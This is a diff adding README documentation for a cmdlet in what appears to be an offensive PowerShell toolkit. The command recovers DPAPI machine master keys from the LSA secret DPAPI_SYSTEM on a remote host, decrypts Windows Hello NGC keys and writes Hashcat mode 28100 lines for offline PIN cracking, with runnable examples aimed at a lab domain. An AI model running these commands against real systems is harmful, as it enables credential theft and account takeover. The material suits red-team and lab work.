@@ -787,6 +787,27 @@ Get-TBONGCInfo -ServerName corp1-wks01.corp1.lab.home-labs.lol -IncludeProtector
   Select-Object NgcGuid, UserSid, KeyStorageProviderGuid1, InputDataLength, KeyStorageProviderGuid2
 ```
 
+#### Get-TBONGCCryptoKeys
+
+Enumerates `C:\Windows\ServiceProfiles\LocalService\AppData\Roaming\Microsoft\Crypto\Keys` and correlates key material with NGC containers.
+This cmdlet can decrypt NGC private key properties (to extract PBKDF2 salt/rounds) and optionally emit `$WINHELLO$*...` Hashcat mode 28100 lines for offline PIN cracking.
+
+```powershell
+# Recover decrypted machine master keys (DPAPI_SYSTEM -> masterkeys), then enumerate matching NGC crypto keys.
+$mk = Get-TBORegLsaSecrets -ServerName corp1-wks01.corp1.lab.home-labs.lol -Name DPAPI_SYSTEM |
+  Get-TBODpapiMasterKeys -Scope Machine
+Get-TBONGCCryptoKeys -ServerName corp1-wks01.corp1.lab.home-labs.lol -MasterKeys $mk
+
+# Emit Hashcat 28100 lines (when PBKDF2 parameters are present)
+Get-TBONGCCryptoKeys -ServerName corp1-wks01.corp1.lab.home-labs.lol -MasterKeys $mk -IncludeHashcat |
+  Where-Object Hashcat28100 |
+  Select-Object -ExpandProperty Hashcat28100 |
+  Out-File -Encoding ascii winhello.hc28100
+
+# Filter by a specific key GUID (works even if NGC enumeration is blocked)
+Get-TBONGCCryptoKeys -ServerName corp1-wks01.corp1.lab.home-labs.lol -MasterKeys $mk -KeyGuid '{01234567-89ab-cdef-0123-456789abcdef}' -IncludeHashcat
+```
+
 #### Get-TBODpapiBlob
 
 Decrypts a DPAPI blob using a DPAPI master key.
